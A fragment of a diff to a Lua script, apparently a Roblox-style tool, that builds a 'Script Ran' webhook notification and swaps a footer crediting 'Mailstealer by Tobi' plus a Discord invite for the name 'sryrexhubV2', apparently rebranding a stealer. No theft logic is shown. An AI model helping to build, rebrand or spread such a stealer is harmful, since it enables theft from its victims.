@@ -10,7 +10,7 @@ local function SendMessage(url)
             ["title"] = "Script Ran",
             ["color"] = 65280,
             ["footer"] = {
-                ["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+                ["text"] = "sryrexhubV2"
             }
         }}
     }
